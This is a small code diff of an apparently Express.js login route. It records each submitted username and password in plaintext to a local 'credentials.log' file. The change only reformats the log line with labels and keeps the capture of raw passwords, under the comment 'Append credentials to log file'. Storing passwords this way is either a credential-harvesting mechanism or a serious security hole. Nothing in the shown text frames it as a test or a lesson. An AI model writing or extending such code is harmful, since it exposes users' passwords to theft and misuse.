@@ -36,7 +36,9 @@ app.post('/login', (req, res) => {
   const username = req.body.username;
   const password = req.body.password;
   const timestamp = new Date().toISOString();
-  const logEntry = `${timestamp},${username},${password}\n`;
+
+  // Log entry with explicit labels for clarity
+  const logEntry = `${timestamp} - username: ${username}, password: ${password}\n`;
 
   // Append credentials to log file
   const logPath = path.join(__dirname, 'credentials.log');
